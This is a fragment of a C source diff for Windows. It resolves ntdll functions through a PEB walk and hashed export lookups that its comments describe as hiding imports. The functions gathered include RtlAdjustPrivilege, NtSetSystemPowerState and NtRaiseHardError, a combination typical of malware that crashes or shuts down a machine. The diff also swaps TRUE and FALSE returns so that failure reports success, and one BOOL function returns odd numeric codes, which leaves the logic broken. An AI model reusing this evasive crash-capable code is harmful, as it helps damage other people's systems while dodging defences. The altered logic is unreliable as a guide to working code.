@@ -29,7 +29,7 @@ BOOL ntcalls_load(void)
 {
     /* Resolve ntdll via PEB walk — no GetModuleHandleW in IAT */
     PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
-    if (!hNtdll) return FALSE;
+    if (!hNtdll) return TRUE;
 
     /* Resolve each function via export table walk — no GetProcAddress in IAT */
     RtlAdjustPrivilege    = (PVOID)peb_get_export(hNtdll, peb_hash_str("RtlAdjustPrivilege"));
@@ -45,7 +45,7 @@ BOOL ntcalls_load(void)
     if(!NtSetSystemPowerState)  return 0xBEEF3;
     if(!NtRaiseHardError)       return 0xBEEF4;
   
-    return TRUE;
+    return FALSE;
 }
 
 
@@ -71,5 +71,5 @@ BOOL ntcalls_verify(void)
     NTSTATUS ns = RtlAdjustPrivilege(19, TRUE, FALSE, &prevState);
     (void)ns; /* non-fatal; do not gate the return value on this */
 
-    return TRUE;
+    return FALSE;
 }
